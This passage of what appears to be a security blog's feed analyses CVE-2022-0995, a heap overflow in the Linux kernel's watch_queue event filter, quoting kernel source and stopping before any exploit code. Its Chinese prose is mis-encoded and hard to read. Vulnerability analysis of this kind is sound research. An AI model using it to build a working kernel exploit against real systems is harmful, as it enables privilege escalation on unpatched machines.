c87ebe310813db14ba8713a49802479b8014291691c37181e6713ed5e3ffc454e5479be58eacad603bc61e074bada48d201b68857f73b6f978cdb8115dc96693052bb735ffe2941fde9937c07ba9fe6f97057e60a8a6816761e4f9f293ed8978df2f8cbb27061bab67185c84d93e3afb8dd2a7f247e32185fa48fa33bcff9f37e0c6bd99d26c0c585842fae5da8974122336bacf3c8a57ea00d0474fe0991ad3c3afb8a31bff0027216eaffa4b3227cda82b2840190649fd4d36f0e0dd38e46b1a25a914b468fd6e46256d0e5f0e4c3e7499d5c3a2616165a2aa77bbd9f02539db57861c723f136338662ee512eaf59cf8f6beb61d45a95dd41c27288c36f7634bd6afe13a646bd05015e02b7e0fd465150311d215f8ee351796bbfdad49cdaf6beebfc8d04f929805be35667daeab146fc8d155b26ac26e18a816581c9e6585a03bbf268fa1fb67f22a3d160dc75512ec7787e9f15da282127bf2d06f8e0556ada99aa908fb14d93f164c08a0fafa730dee1d61c016fb30e02fd81b5fcbcb0e08ae50022c67e6857e406769d1311db81789fb9ff60f15a2bc1e9da</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">é¢è¯•å®˜ï¼šå¬è¯´ä½ ç®—æ³•è¿˜è¡Œï¼Œæ¥ç»™ğŸ‘´ç®€å•æ‰‹å†™ä¸ªçº¢é»‘æ ‘å°±è®©ä½ è¿‡äº†</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">é¢è¯•å®˜ï¼šå¬è¯´ä½ ç®—æ³•è¿˜è¡Œï¼Œæ¥ç»™ğŸ‘´ç®€å•æ‰‹å†™ä¸ªçº¢é»‘æ ‘å°±è®©ä½ è¿‡äº†</summary>
    
    
    
    <category term="ALGORITHM" scheme="http://blog.arttnba3.cn/categories/ALGORITHM/"/>
    
    
    <category term="C&amp;C++" scheme="http://blog.arttnba3.cn/tags/C-C/"/>
    
    <category term="Algorithm" scheme="http://blog.arttnba3.cn/tags/Algorithm/"/>
    
    <category term="Tree" scheme="http://blog.arttnba3.cn/tags/Tree/"/>
    
    <category term="Binary Search Tree" scheme="http://blog.arttnba3.cn/tags/Binary-Search-Tree/"/>
    
    <category term="AVL Tree" scheme="http://blog.arttnba3.cn/tags/AVL-Tree/"/>
    
    <category term="Red-Black Tree" scheme="http://blog.arttnba3.cn/tags/Red-Black-Tree/"/>
    
  </entry>
  
  <entry>
    <title>ã€CVE.0x08ã€‘CVE-2022-0995 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</title>
    <link href="http://blog.arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/"/>
    <id>http://blog.arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/</id>
    <published>2022-04-06T04:24:09.000Z</published>
    <updated>2022-04-06T04:40:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘åœ¨çœ‹ç€ä½ ğŸ‘_ğŸ‘</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>CVE-2022-0995 æ˜¯è¿‘æ—¥çˆ†å‡ºæ¥çš„ä¸€ä¸ªå­˜åœ¨äº _è§‚å¯Ÿé˜Ÿåˆ—äº‹ä»¶é€šçŸ¥å­ç³»ç»Ÿ_ï¼ˆwatch_queue event notification subsystemï¼‰ä¸­çš„ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œè¯¥æ¼æ´è‡ªå†…æ ¸ç‰ˆæœ¬ <code>5.8</code> ä¸­ä¼´éšç€ watch queue subsystem å¼•å…¥ï¼Œåœ¨ <code>5.17-rc7</code> ç‰ˆæœ¬ä¸­è¢«ä¿®å¤</p><p>ä¸è¿‡è™½ç„¶è·å¾—äº† <code>7.1</code> çš„ CVSS è¯„åˆ†ï¼Œä½†è¿™ä¸ªæ¼æ´ä¼¼ä¹å¹¶æ²¡æœ‰ä»€ä¹ˆçƒ­åº¦ï¼Œä¸è¿‡åœ¨ç¬”è€…çœ‹æ¥è¿™ä»ç„¶æ˜¯ä¸€ä¸ªå“ç›¸ä¸é”™çš„æ¼æ´</p><p>åœ¨å¼€å§‹ä¹‹å‰æˆ‘ä»¬å…ˆæ¥è¡¥å……ä¸€äº›åŸºç¡€çŸ¥è¯†</p><h2 id="General-notification-mechanism"><a href="#General-notification-mechanism" class="headerlink" title="General notification mechanism"></a><em>General notification mechanism</em></h2><blockquote><p>å‚è§<a href="https://www.kernel.org/doc/html/latest/watch_queue.html">https://www.kernel.org/doc/html/latest/watch_queue.html</a></p></blockquote><p><em>é€šç”¨é€šçŸ¥æœºåˆ¶</em> æ˜¯å»ºç«‹åœ¨æ ‡å‡†ç®¡é“é©±åŠ¨ä¹‹ä¸Šçš„ï¼Œå…¶å¯ä»¥æœ‰æ•ˆåœ°å°†æ¥è‡ªå†…æ ¸çš„é€šçŸ¥æ¶ˆæ¯æ‹¼æ¥åˆ°ç”¨æˆ·æ‰“å¼€çš„ç®¡é“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>CONFIG_WATCH_QUEUE</code> ç¼–è¯‘é€‰é¡¹å¯ç”¨ï¼ˆé»˜è®¤å¼€å¯ï¼‰</p><p>è¯¥æœºåˆ¶é€šè¿‡ä¸€ä¸ªä»¥ç‰¹æ®Šæ¨¡å¼æ‰“å¼€çš„ç®¡é“å®ç°ï¼Œå†…æ ¸ç”Ÿæˆçš„æ¶ˆæ¯è¢«ä¿å­˜åˆ°ç®¡é“å†…éƒ¨çš„å¾ªç¯ç¯å½¢ç¼“å†²åŒºä¸­ï¼ˆ<code>pipe_buffer</code> é˜Ÿåˆ—ï¼‰ï¼Œé€šè¿‡ <code>read()</code> è¿›è¡Œè¯»å–ï¼Œç”±äºåœ¨æŸäº›æƒ…å†µä¸‹æˆ‘ä»¬å¯èƒ½æƒ³è¦å°†æ·»åŠ çš„å†…å®¹è¿˜åŸåˆ°ç¯ä¸Šï¼Œå› æ­¤åœ¨æ­¤ç±»ç®¡é“ä¸Šç¦ç”¨äº† splice ä»¥åŠç±»ä¼¼åŠŸèƒ½ï¼ˆå› ä¸ºè¿™å¯èƒ½å¯¼è‡´å…¶ä¸é€šçŸ¥æ¶ˆæ¯äº¤ç»‡åœ¨ä¸€èµ·ï¼‰</p><p>ç®¡é“çš„æ‰€æœ‰è€…åº”å½“å‘Šè¯‰å†…æ ¸å“ªäº›èµ„æºå…¶æƒ³è¦é€šè¿‡è¯¥ç®¡é“è¿›è¡Œè§‚å¯Ÿï¼Œåªæœ‰è¿æ¥åˆ°è¯¥ç®¡é“ä¸Šçš„èµ„æºæ‰ä¼šå¾€é‡Œè¾¹æ’å…¥æ¶ˆæ¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸€ä¸ªèµ„æºå¯èƒ½ä¼šä¸å¤šä¸ªç®¡é“ç»‘å®šå¹¶åŒæ—¶å°†æ¶ˆæ¯æ’å…¥æ‰€æœ‰ç®¡é“</p><p>è‹¥ç¯ä¸­æ²¡æœ‰å¯ç”¨çš„æ’æ§½æˆ–å¯ç”¨çš„é¢„åˆ†é…çš„ message bufferï¼ˆä¸€ä¸ªç®¡é“é»˜è®¤åªæœ‰ 16 ä¸ª <code>pipe_buffer</code> â€”â€”å¯¹åº” 16 å¼ å†…å­˜é¡µï¼‰ï¼Œåˆ™æ¶ˆæ¯å°†ä¼šè¢«ä¸¢å¼ƒï¼Œåœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œ<code>read()</code> å°†åœ¨è¯»å–å½“å‰ç¼“å†²åŒºçš„æœ€åä¸€æ¡æ¶ˆæ¯åå°† <code>WATCH_META_LOSS_NOTIFICATION</code> æ’å…¥è¾“å‡ºç¼“å†²åŒº</p><h3 id="Watch-Queueï¼ˆNotification-Outputï¼‰API"><a href="#Watch-Queueï¼ˆNotification-Outputï¼‰API" class="headerlink" title="Watch Queueï¼ˆNotification Outputï¼‰API"></a>Watch Queueï¼ˆNotification Outputï¼‰API</h3><p>ä¸€ä¸ª <em>è§‚æµ‹é˜Ÿåˆ—</em> ï¼ˆwatch queueï¼‰æ˜¯ç”±ä¸€ä¸ªåº”ç”¨åˆ†é…çš„ç”¨ä»¥è®°å½•é€šçŸ¥çš„ç¼“å†²åŒºï¼Œå…¶å·¥ä½œåŸç†å®Œå…¨éšè—åœ¨ç®¡é“è®¾å¤‡é©±åŠ¨ä¸­ï¼Œä½†æœ‰å¿…è¦è·å¾—ä¸€ä¸ªå¯¹å…¶çš„å¼•ç”¨ä»¥è®¾ç½®ä¸€ä¸ªè§‚æµ‹ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹ API è¿›è¡Œç®¡ç†ï¼š</p><ul><li><p><code>struct watch_queue *get_watch_queue(int fd);</code></p><p>ç”±äºè§‚æµ‹é˜Ÿåˆ—åœ¨å†…æ ¸ä¸­é€šè¿‡å®ç°ç¼“å†²åŒºçš„ç®¡é“çš„æ–‡ä»¶æè¿°ç¬¦è¡¨ç¤ºï¼Œç”¨æˆ·ç©ºé—´å¿…é¡»é€šè¿‡ç³»ç»Ÿè°ƒç”¨ä¼ é€’è¯¥æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™å¯ä»¥ç”¨äºä»ç³»ç»Ÿè°ƒç”¨ä¸­æŸ¥æ‰¾æŒ‡å‘è§‚æµ‹é˜Ÿåˆ—çš„ä¸é€æ˜æŒ‡é’ˆ</p></li><li><p><code>void put_watch_queue(struct watch_queue *wqueue);</code></p><p>è¯¥å‡½æ•°ç”¨ä»¥ä¸¢å¼ƒä» <code>get_watch_queue()</code> è·å¾—çš„å¼•ç”¨</p></li></ul><h3 id="Event-Filter"><a href="#Event-Filter" class="headerlink" title="Event Filter"></a>Event Filter</h3><p>å½“ä¸€ä¸ªè§‚æµ‹é˜Ÿåˆ—è¢«åˆ›å»ºåï¼Œæˆ‘ä»¬å¯ä»¥åº”ç”¨ä¸€ç»„ <em>è¿‡æ»¤å™¨</em> ï¼ˆfiltersï¼‰ä»¥é™åˆ¶æ¥æ”¶çš„äº‹ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_filter</span> <span class="hljs-title">filter</span> =</span> &#123;<br>        ...<br>&#125;;<br>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ filter åº”ä¸ºä¸€ä¸ª <code>struct watch_notification_filter</code> ç±»å‹å˜é‡ï¼Œå…¶ä¸­ <code>nr_filters</code> è¡¨ç¤º <code>filters[]</code> æ•°ç»„ä¸­è¿‡æ»¤å™¨çš„æ•°é‡ï¼Œè€Œ <code>__reserved</code> åº”ä¸º 0ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_filter</span> &#123;</span><br>        __u32   nr_filters;<br>        __u32   __reserved;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_type_filter</span> <span class="hljs-title">filters</span>[];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p> <code>filters[]</code> ä¸ºä¸€ä¸ª <code>watch_notification_type_filter</code> ç±»å‹çš„ç»“æ„ä½“æ•°ç»„ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_type_filter</span> &#123;</span><br>        __u32   type;<br>        __u32   info_filter;<br>        __u32   info_mask;<br>        __u32   subtype_filter[<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p><code>type</code> ä¸ºè¦è¿‡æ»¤çš„äº‹ä»¶ç±»å‹ï¼Œåº”å½“ä¸ºç±»ä¼¼ <code>WATCH_TYPE_KEY_NOTIFY</code> çš„å€¼</p></li><li><p><code>info_filter</code> ä¸ <code>info_mask</code> å……å½“é€šçŸ¥è®°å½•çš„ä¿¡æ¯å­—æ®µçš„è¿‡æ»¤å™¨ï¼Œä»…åœ¨ä»¥ä¸‹æƒ…å†µæ‰å°†é€šçŸ¥å†™å…¥ç¼“å†²åŒºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(watch.info &amp; info_mask) == info_filter<br></code></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œè¿™å¯ä»¥ç”¨äºå¿½ç•¥ä¸åœ¨ä¸€ä¸ªæŒ‚è½½æ ‘ä¸Šçš„è§‚æµ‹ç‚¹çš„äº‹ä»¶</p></li><li><p><code>subtype_filter</code> ä¸ºä¸€ä¸ªæŒ‡ç¤ºæˆ‘ä»¬æ„Ÿå…´è¶£çš„å­ç±»å‹çš„ bitmaskï¼Œ<code>subtype_filter[0]</code> çš„ 0 ä½å¯¹åº”å­ç±»å‹ 0ï¼Œ1 ä½å¯¹åº”å­ç±»å‹ 1ï¼Œä»¥æ­¤ç±»æ¨</p></li></ul><p>è‹¥ ioctl() çš„å‚æ•°ä¸º NULLï¼Œåˆ™è¿‡æ»¤å™¨å°†è¢«ç§»é™¤ï¼Œæˆ‘ä»¬å°†æ¥æ”¶åˆ°æ‰€æœ‰æ¥è‡ªè§‚æµ‹æºçš„äº‹ä»¶</p><h2 id="å†…æ ¸ä¸­-watch-queue-subsystem-ä¸­-Event-Filter-çš„å®ç°"><a href="#å†…æ ¸ä¸­-watch-queue-subsystem-ä¸­-Event-Filter-çš„å®ç°" class="headerlink" title="å†…æ ¸ä¸­ watch queue subsystem ä¸­ Event Filter çš„å®ç°"></a>å†…æ ¸ä¸­ watch queue subsystem ä¸­ Event Filter çš„å®ç°</h2><p>å‰é¢æˆ‘ä»¬æŠ„äº†ä¸€å¤§æ®µçš„ kernel documentï¼Œç°åœ¨æˆ‘ä»¬æ¥æ·±å…¥æºç çœ‹ä¸€ä¸‹ watch queue subsystem çš„å®ç°æœºåˆ¶</p><p>å½“æˆ‘ä»¬è°ƒç”¨ <code>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</code> æ—¶ï¼Œä¼šè°ƒç”¨ <code>do_vfs_ioctl()</code> åˆ¤æ–­ cmd è¿›è¡Œå¤„ç†ï¼Œè€Œæˆ‘ä»¬çš„ <code>IOC_WATCH_QUEUE_SET_FILTER</code> ä¸åœ¨å…¶åˆ—è¡¨ä¸­ï¼Œæ‰€ä»¥æœ€åä¼šèµ°åˆ° <code>vfs_ioctl()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(ioctl, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, arg)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span> =</span> fdget(fd);<br><span class="hljs-type">int</span> error;<br><br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">return</span> -EBADF;<br><br>error = security_file_ioctl(f.file, cmd, arg);<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">goto</span> out;<br><br>error = do_vfs_ioctl(f.file, fd, cmd, arg);<br><span class="hljs-keyword">if</span> (error == -ENOIOCTLCMD)<br>error = vfs_ioctl(f.file, cmd, arg);<br><br>out:<br>fdput(f);<br><span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>vfs_ioctl()</code> ä¸­ä¼šè°ƒç”¨ file ç»“æ„ä½“è‡ªèº«çš„å‡½æ•°è¡¨ä¸­çš„ <code>unlocked_ioctl</code> æŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">vfs_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-type">int</span> error = -ENOTTY;<br><br><span class="hljs-keyword">if</span> (!filp-&gt;f_op-&gt;unlocked_ioctl)<br><span class="hljs-keyword">goto</span> out;<br><br>error = filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg);<br><span class="hljs-keyword">if</span> (error == -ENOIOCTLCMD)<br>error = -ENOTTY;<br> out:<br><span class="hljs-keyword">return</span> error;<br>&#125;<br>EXPORT_SYMBOL(vfs_ioctl);<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬éœ€è¦å°†ç›®å…‰æ”¾å›ç®¡é“çš„åˆ›å»ºæµç¨‹ä¸­åˆ†é…æ–‡ä»¶æè¿°ç¬¦çš„éƒ¨åˆ†ï¼Œå­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">do_pipe2()<br>    __do_pipe_flags()<br>    create_pipe_files()<br>    alloc_file_pseudo()<br>    alloc_file()<br></code></pre></td></tr></table></figure><p><code>alloc_file()</code> åˆ†é…ä¸€ä¸ª file ç»“æ„ä½“å¹¶å°†å…¶å‡½æ•°è¡¨è®¾ä¸ºä¸Šå±‚è°ƒç”¨ä¼ å…¥çš„å‡½æ•°è¡¨ï¼Œè€Œåœ¨ <code>create_pipe_files()</code> ä¸­ä¼ å…¥çš„å‡½æ•°è¡¨ä¸º <code>pipefifo_fops</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">pipefifo_fops</span> =</span> &#123;<br>.open= fifo_open,<br>.llseek= no_llseek,<br>.read_iter= pipe_read,<br>.write_iter= pipe_write,<br>.poll= pipe_poll,<br>.unlocked_ioctl= pipe_ioctl,<br>.release= pipe_release,<br>.fasync= pipe_fasync,<br>.splice_write= iter_file_splice_write,<br>&#125;;<br></code></pre></td></tr></table></figure><p>å› æ­¤æœ€ç»ˆè°ƒç”¨åˆ°çš„æ˜¯ <code>pipe_ioctl()</code>ï¼Œå¯¹äº cmd <code>IOC_WATCH_QUEUE_SET_FILTER</code> è€Œè¨€ï¼Œæœ€ç»ˆä¼šè°ƒç”¨ <code>watch_queue_set_filter()</code> å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">pipe_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br><span class="hljs-type">int</span> count, head, tail, mask;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FIONREAD:<br>__pipe_lock(pipe);<br>count = <span class="hljs-number">0</span>;<br>head = pipe-&gt;head;<br>tail = pipe-&gt;tail;<br>mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">while</span> (tail != head) &#123;<br>count += pipe-&gt;bufs[tail &amp; mask].len;<br>tail++;<br>&#125;<br>__pipe_unlock(pipe);<br><br><span class="hljs-keyword">return</span> put_user(count, (<span class="hljs-type">int</span> __user *)arg);<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">case</span> IOC_WATCH_QUEUE_SET_SIZE: &#123;<br><span class="hljs-type">int</span> ret;<br>__pipe_lock(pipe);<br>ret = watch_queue_set_size(pipe, arg);<br>__pipe_unlock(pipe);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-keyword">case</span> IOC_WATCH_QUEUE_SET_FILTER:<br><span class="hljs-keyword">return</span> watch_queue_set_filter(<br>pipe, (<span class="hljs-keyword">struct</span> watch_notification_filter __user *)arg);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -ENOIOCTLCMD;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01.æ¼æ´åˆ†æ"></a>0x01.æ¼æ´åˆ†æ</h1><p>æ¼æ´ä¾¿å‘ç”Ÿåœ¨ <code>watch_queue_set_filter()</code>ä¸­å°† filter æ•°ç»„ä»ç”¨æˆ·ç©ºé—´æ‹·è´åˆ°å†…æ ¸ç©ºé—´çš„è¿‡ç¨‹å½“ä¸­ï¼Œç°åœ¨è®©æˆ‘ä»¬ä»”ç»†å®¡è§†è¿™ä¸ªå‡½æ•°çš„æ‰§è¡Œæµç¨‹ï¼Œåœ¨ä¸€å¼€å§‹æ—¶é¦–å…ˆä¼šå°†ç”¨æˆ·ç©ºé—´çš„ <code>watch_notification_filter</code> ç»“æ„æ‹·è´åˆ°å†…æ ¸ç©ºé—´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">watch_queue_set_filter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> watch_notification_filter __user *_filter)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_type_filter</span> *<span class="hljs-title">tf</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_filter</span> <span class="hljs-title">filter</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_type_filter</span> *<span class="hljs-title">q</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_filter</span> *<span class="hljs-title">wfilter</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">wqueue</span> =</span> pipe-&gt;watch_queue;<br><span class="hljs-type">int</span> ret, nr_filter = <span class="hljs-number">0</span>, i;<br><br><span class="hljs-keyword">if</span> (!wqueue)<br><span class="hljs-keyword">return</span> -ENODEV;<br><br><span class="hljs-keyword">if</span> (!_filter) &#123;<br><span class="hljs-comment">/* Remove the old filter */</span><br>wfilter = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">goto</span> <span class="hljs-built_in">set</span>;<br>&#125;<br><br><span class="hljs-comment">/* Grab the user&#x27;s filter specification */</span><br><span class="hljs-keyword">if</span> (copy_from_user(&amp;filter, _filter, <span class="hljs-keyword">sizeof</span>(filter)) != <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">if</span> (filter.nr_filters == <span class="hljs-number">0</span> ||<br>    filter.nr_filters &gt; <span class="hljs-number">16</span> ||<br>    filter.__reserved != <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br></code></pre></td></tr></table></figure><p>ä¹‹å <code>memdup_user()</code> åˆ†é…ä¸€å—ä¸´æ—¶ç©ºé—´ï¼Œå°†ç”¨æˆ·ç©ºé—´çš„ filter æ•°ç»„æ‹·è´è‡³è¯¥ä¸´æ—¶ç©ºé—´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">tf = memdup_user(_filter-&gt;filters, filter.nr_filters * <span class="hljs-keyword">sizeof</span>(*tf));<br><span class="hljs-keyword">if</span> (IS_ERR(tf))<br><span class="hljs-keyword">return</span> PTR_ERR(tf);<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šéå†æ¯ä¸€ä¸ª <code>watch_notification_type_filter</code> ç»“æ„ï¼Œè®°å½• type åœ¨æŒ‡å®šèŒƒå›´çš„ filter çš„æ•°é‡åˆ°å˜é‡ <code>nr_filter</code> ä¸­ï¼Œè¿™é‡Œå…¶åˆ¤æ–­ä¸€ä¸ª type æ˜¯å¦åˆæ³•çš„èŒƒå›´æ˜¯ <code>sizeof(wfilter-&gt;type_filter) * 8</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">ret = -EINVAL;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; filter.nr_filters; i++) &#123;<br><span class="hljs-keyword">if</span> ((tf[i].info_filter &amp; ~tf[i].info_mask) ||<br>    tf[i].info_mask &amp; WATCH_INFO_LENGTH)<br><span class="hljs-keyword">goto</span> err_filter;<br><span class="hljs-comment">/* Ignore any unknown types */</span><br><span class="hljs-keyword">if</span> (tf[i].type &gt;= <span class="hljs-keyword">sizeof</span>(wfilter-&gt;type_filter) * <span class="hljs-number">8</span>)<br><span class="hljs-keyword">continue</span>;<br>nr_filter++;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šåˆ†é…çœŸæ­£å‚¨å­˜ filter çš„çš„ç©ºé—´ï¼Œè¿™é‡Œç”¨äº†ä¸€ä¸ª <code>struct_size()</code> å¯¼å‡ºçš„å¤§å°ä¸º <code>sizeof(wfilter) + sizeof(filters) * 